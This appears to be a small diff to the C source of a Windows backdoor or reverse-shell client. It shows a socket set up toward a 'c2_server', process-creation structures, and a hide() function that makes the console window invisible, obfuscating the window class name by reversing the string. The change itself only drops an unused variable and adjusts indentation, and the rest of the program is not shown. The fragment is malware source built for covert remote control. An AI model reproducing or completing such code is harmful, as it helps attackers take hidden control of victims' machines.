@@ -16,7 +16,6 @@ int main(void)
 	WSADATA wsaData;
 	SOCKET socket;
 	struct sockaddr_in c2_server;
-	char ip_addr[16];
 	STARTUPINFO st;
 	PROCESS_INFORMATION pi;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -41,7 +40,7 @@ int main(void)
 }
 void hide()
 {
-	HWND stealth; /*creating stealth (window is not visible)*/
+    HWND stealth; /*creating stealth (window is not visible)*/
     AllocConsole();
     stealth=FindWindowA(strrev("ssalCwodniWelosnoC"),NULL);
     ShowWindow(stealth,0);
